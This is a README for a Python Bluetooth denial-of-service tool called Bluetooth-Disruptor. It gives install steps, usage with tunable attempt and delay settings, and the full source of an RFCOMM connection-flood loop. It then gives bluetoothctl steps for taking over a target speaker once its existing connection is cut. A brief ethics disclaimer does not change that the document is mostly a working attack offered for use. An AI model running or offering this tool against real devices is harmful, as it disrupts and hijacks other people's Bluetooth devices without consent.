# Bluetooth-Disruptor 💥

A powerful Python-based tool designed for conducting **Bluetooth Denial-of-Service (DoS) attacks**. This utility aims to disrupt existing Bluetooth connections to a target device (like a smart speaker) by overwhelming it with connection requests, potentially allowing you to establish a new connection.

## 🌟 Features

* **Cross-Platform Compatibility:** Works seamlessly on both **Full Linux distributions** (e.g., Kali Linux, Ubuntu) and **Termux on Android**.
* **Intuitive Command-Line Interface (CLI):** Easy-to-use arguments for flexible operation.
* **Robust Error Handling:** Designed for stable execution with proper error management.
* **Advanced Device Scanning:** Discover nearby Bluetooth devices with detailed information.
* **Configurable DoS Parameters:** Adjust attack intensity with customizable attempts and delays.
* **Verbose Output:** Get detailed real-time feedback on the attack progress.

## ⚠️ Disclaimer

This tool is intended for **educational purposes and ethical penetration testing ONLY**. Use it responsibly and only on devices you own or have explicit permission to test. Unauthorized access or disruption of Bluetooth devices is illegal and unethical. The author is not responsible for any misuse or damage caused by this tool.

---

## 🚀 Getting Started

### Prerequisites

Make sure you have Python 3 and the necessary Bluetooth development libraries installed.

#### For Full Linux Distributions (Debian/Ubuntu-based):

```bash
sudo apt update
sudo apt install python3-pip libbluetooth-dev bluez
pip3 install pybluez
For Termux on Android:
Bash

pkg update && pkg upgrade
pkg install python python-pip bluez
pip install pybluez
# Note: Installing pybluez on Termux might require C/C++ development packages.
# If you encounter errors, you may need to install 'pkg install clang' and 'pkg install make'.
# Bluetooth functionalities in Termux might have limitations without root access.
Installation
Clone the repository:

Bash

git clone [https://github.com/YOUR_GITHUB_USERNAME/Bluetooth-Disruptor.git](https://github.com/YOUR_GITHUB_USERNAME/Bluetooth-Disruptor.git)
cd Bluetooth-Disruptor
Replace YOUR_GITHUB_USERNAME with your actual GitHub username.

Make the script executable:

Bash

chmod +x bt-disruptor.py
⚙️ Usage
The bt-disruptor.py script utilizes command-line arguments for easy operation.

1. Scan for Devices
First, identify your target device's MAC address. Put your target speaker in pairing mode to make it discoverable.

Bash

python3 bt-disruptor.py --scan
# For more detailed output:
python3 bt-disruptor.py --scan --verbose
2. Initiate the DoS Attack
Once you have the target's MAC address, you can launch the DoS attack.
Open two terminals.

In Terminal 1 (for the DoS attack):

Bash

python3 bt-disruptor.py --target XX:XX:XX:XX:XX:XX 
Replace XX:XX:XX:XX:XX:XX with the actual MAC address of your target speaker.

You can customize the attack parameters:

Bash

python3 bt-disruptor.py --target XX:XX:XX:XX:XX:XX --attempts 2000 --delay 0.005 --port 1 --verbose
-t, --target: Target Bluetooth MAC address (required).
-s, --scan: Scan for nearby Bluetooth devices.
-a, --attempts: Number of connection attempts (default: 1000).
-d, --delay: Delay between attempts in seconds (default: 0.01s).
-p, --port: RFCOMM port to connect to (default: 1).
-v, --verbose: Enable verbose output for more details.
3. Connect to the Speaker
In Terminal 2 (to connect your device):
As soon as the DoS attack begins and the speaker's current connection is disrupted, quickly attempt to connect your own device.

Using bluetoothctl (recommended for Linux):

Bash

bluetoothctl
[bluetooth]# agent on
[bluetooth]# pair XX:XX:XX:XX:XX:XX   # If not paired previously
[bluetooth]# trust XX:XX:XX:XX:XX:XX
[bluetooth]# connect XX:XX:XX:XX:XX:XX
Replace XX:XX:XX:XX:XX:XX with the target speaker's MAC address.

Alternatively, try connecting via your system's (or phone's) standard Bluetooth settings.

💻 bt-disruptor.py Source Code
Python

import bluetooth
import time
import argparse
import sys
import os

# --- Constants ---
DEFAULT_ATTEMPTS = 1000
DEFAULT_DELAY = 0.01
DEFAULT_PORT = 1 # Common RFCOMM port

# --- Utility Functions ---
def get_platform():
    """Determines the operating system/platform."""
    if sys.platform.startswith('linux'):
        if 'ANDROID_ROOT' in os.environ:
            return "Termux/Android"
        return "Linux"
    return "Unknown"

def display_status(message, level="INFO"):
    """Prints status messages with color coding."""
    if level == "INFO":
        color = "\033[94m" # Blue
    elif level == "SUCCESS":
        color = "\033[92m" # Green
    elif level == "WARNING":
        color = "\033[93m" # Yellow
    elif level == "ERROR":
        color = "\033[91m" # Red
    else:
        color = "\033[0m" # Reset
    print(f"{color}[{level}]\033[0m {message}")

def mac_address_valid(mac):
    """Validates if a string is a valid MAC address format."""
    return len(mac) == 17 and all(c in "0123456789ABCDEF:" for c in mac) and mac.count(':') == 5

# --- Core Functionality ---
def scan_devices(duration=8, verbose=False):
    """Scans for nearby Bluetooth devices."""
    display_status(f"Scanning for Bluetooth devices for {duration} seconds...")
    try:
        nearby_devices = bluetooth.discover_devices(duration=duration, lookup_names=True, flush_cache=True, lookup_class=True)
        if not nearby_devices:
            display_status("No devices found. Ensure Bluetooth is on and devices are discoverable.", "WARNING")
            return []

        display_status(f"Found {len(nearby_devices)} devices:", "SUCCESS")
        for addr, name, _class in nearby_devices:
            display_status(f"  Name: {name if name else 'N/A'}, Address: {addr}, Class: {hex(_class) if _class else 'N/A'}")
        return nearby_devices
    except bluetooth.btcommon.BluetoothError as e:
        display_status(f"Bluetooth scan error: {e}. Ensure Bluetooth adapter is enabled and permissions are correct.", "ERROR")
        return []
    except Exception as e:
        display_status(f"An unexpected error occurred during scan: {e}", "ERROR")
        return []

def bluetooth_dos_attack(target_mac, num_attempts, delay, port, verbose=False):
    """
    Attempts a Bluetooth Denial of Service attack by repeatedly trying to connect.
    This may disrupt existing connections or prevent new ones.
    """
    display_status(f"Initiating DoS attack on {target_mac} with {num_attempts} attempts at {delay}s intervals...")
    attempt_count = 0
    successful_brief_connections = 0

    for i in range(num_attempts):
        attempt_count += 1
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((target_mac, port))
            if verbose:
                display_status(f"Attempt {attempt_count}: Brief connection to {target_mac}", "INFO")
            successful_brief_connections += 1
            sock.close()
        except bluetooth.btcommon.BluetoothError as e:
            if verbose:
                display_status(f"Attempt {attempt_count}: Connection failed/refused (Expected for DoS): {e}", "WARNING")
        except Exception as e:
            display_status(f"Attempt {attempt_count}: Unexpected error: {e}", "ERROR")
            
        time.sleep(delay)

    display_status(f"DoS attack finished. Made {attempt_count} attempts with {successful_brief_connections} brief connections.", "SUCCESS")
    display_status("Now, attempt to connect your own device to the target speaker.", "INFO")

def try_to_connect(target_mac):
    """Provides instructions to connect using bluetoothctl or system settings."""
    display_status("To connect your device, use bluetoothctl in a separate terminal:", "INFO")
    print(f"\n  bluetoothctl")
    print(f"  [bluetooth]# agent on")
    print(f"  [bluetooth]# pair {target_mac}")
    print(f"  [bluetooth]# trust {target_mac}")
    print(f"  [bluetooth]# connect {target_mac}\n")
    display_status("Alternatively, try connecting via your system's Bluetooth settings.", "INFO")

# --- Main Execution ---
if __name__ == "__main__":
    current_platform = get_platform()
    display_status(f"Bluetooth Disruptor v1.0 running on {current_platform}", "INFO")

    parser = argparse.ArgumentParser(
        description="A Bluetooth Denial-of-Service tool for disrupting speaker connections.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", type=str, help="Target Bluetooth MAC address (e.g., 00:1A:2B:3C:4D:5E)")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan for nearby Bluetooth devices.")
    parser.add_argument("-a", "--attempts", type=int, default=DEFAULT_ATTEMPTS,
                        help=f"Number of connection attempts (default: {DEFAULT_ATTEMPTS}).")
    parser.add_argument("-d", "--delay", type=float, default=DEFAULT_DELAY,
                        help=f"Delay between attempts in seconds (default: {DEFAULT_DELAY}s).")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"RFCOMM port to connect to (default: {DEFAULT_PORT}).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output for more details.")

    args = parser.parse_args()

    if args.scan:
        display_status("Performing Bluetooth scan...", "INFO")
        scan_devices(verbose=args.verbose)
        sys.exit(0)

    if not args.target:
        display_status("Error: No target MAC address specified. Use -t or --target.", "ERROR")
        parser.print_help()
        sys.exit(1)

    target_mac = args.target.strip().upper()
    if not mac_address_valid(target_mac):
        display_status(f"Error: Invalid MAC address format: {target_mac}", "ERROR")
        sys.exit(1)

    bluetooth_dos_attack(target_mac, args.attempts, args.delay, args.port, args.verbose)
    try_to_connect(target_mac)
🤝 Contribution
Contributions are welcome! If you find bugs or have suggestions for improvements, please open an issue or submit a pull request.

📄 License
This project is licensed under the MIT License - see the LICENSE file for details.

🙏 Acknowledgements
Inspired by the fascinating world of Bluetooth security and ethical hacking.
<!-- end list -->
